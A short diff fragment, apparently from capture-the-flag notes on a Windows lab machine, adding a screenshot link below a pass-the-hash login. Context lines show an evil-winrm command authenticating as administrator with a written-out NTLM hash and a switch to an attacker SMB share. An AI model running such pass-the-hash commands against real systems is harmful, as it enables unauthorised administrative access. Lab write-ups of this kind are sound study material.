@@ -51,3 +51,5 @@ cd \\10.10.16.3\smb # 将当前的文件夹转到smb
 {% embed url="https://www.ired.team/offensive-security/privilege-escalation/pass-the-hash-privilege-escalation-with-invoke-wmiexec" %}
 
 evil-winrm -i 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
+
+![](.gitbook/assets/admin\_hash.png)
